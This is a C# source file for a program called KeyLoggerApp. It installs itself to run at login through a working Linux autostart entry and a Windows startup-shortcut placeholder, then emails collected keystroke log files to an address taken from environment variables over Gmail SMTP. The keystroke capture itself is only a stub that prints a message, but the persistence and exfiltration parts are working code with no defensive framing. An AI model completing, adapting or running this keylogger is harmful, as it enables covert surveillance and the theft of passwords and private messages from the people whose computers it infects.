using System;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Threading;
using MailKit.Net.Smtp;
using MailKit.Security;
using MimeKit;

namespace KeyLoggerApp
{
    class Program
    {
        static void Main(string[] args)
        {
            SetupEnvironment();
            KeyLogger keyLogger = new KeyLogger();
            keyLogger.StartLogging(); // Assuming you have implemented KeyLogger with StartLogging method
            keyLogger.ListenerThread.Join(); // Assuming ListenerThread is a Thread in KeyLogger
            SendEmail();
        }

        static void SetupEnvironment()
        {
            string scriptPath = Path.GetFullPath("KeyLoggerApp.exe"); // Path to the executable

            string os = Environment.OSVersion.Platform.ToString();
            if (os == "Win32NT")
            {
                string startupFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "script.lnk");
                CreateShortcut(scriptPath, startupFolder);
            }
            else if (os == "Unix")
            {
                string startupFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Personal), ".config", "autostart", "script.desktop");
                CreateDesktopEntry(scriptPath, startupFile);
            }
        }

        static void CreateShortcut(string targetPath, string shortcutPath)
        {
            // Create a Windows shortcut (.lnk) using a third-party library or command-line utility
            // This is a placeholder as creating .lnk files programmatically is complex
            Console.WriteLine("Create shortcut logic goes here.");
        }

        static void CreateDesktopEntry(string targetPath, string entryPath)
        {
            string content = $@"
[Desktop Entry]
Type=Application
Exec={targetPath}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name[en_US]=KeyLoggerApp
Name=KeyLoggerApp
Comment[en_US]=Start KeyLoggerApp at login
Comment=Start KeyLoggerApp at login
";
            File.WriteAllText(entryPath, content);
        }

        static void SendEmail()
        {
            string gmailPassword = Environment.GetEnvironmentVariable("GMAIL_PASSWORD");
            string senderEmail = Environment.GetEnvironmentVariable("SENDER_EMAIL");
            string receiverEmail = Environment.GetEnvironmentVariable("RECEIVER_EMAIL");

            if (string.IsNullOrEmpty(gmailPassword))
            {
                throw new InvalidOperationException("Please set the GMAIL_PASSWORD environment variable.");
            }

            var message = new MimeMessage();
            message.From.Add(new MailboxAddress("KeyLogger", senderEmail));
            message.To.Add(new MailboxAddress("Recipient", receiverEmail));
            message.Subject = "Keylogger Logs";

            string keyLog = File.ReadAllText("key_log.json");
            string sequenceLog = File.ReadAllText("sequence_log.json");

            message.Body = new TextPart("plain")
            {
                Text = $"Key log: {keyLog}\nSequence log: {sequenceLog}"
            };

            using (var client = new SmtpClient())
            {
                try
                {
                    client.Connect("smtp.gmail.com", 465, SecureSocketOptions.SslOnConnect);
                    client.Authenticate(senderEmail, gmailPassword);
                    client.Send(message);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"Error sending email: {e.Message}");
                }
                finally
                {
                    client.Disconnect(true);
                }
            }
        }
    }

    public class KeyLogger
    {
        public Thread ListenerThread { get; private set; }

        public void StartLogging()
        {
            // Initialize and start key logger here
            ListenerThread = new Thread(() =>
            {
                // Key logging logic
                Console.WriteLine("Key logging started.");
            });
            ListenerThread.Start();
        }
    }
}
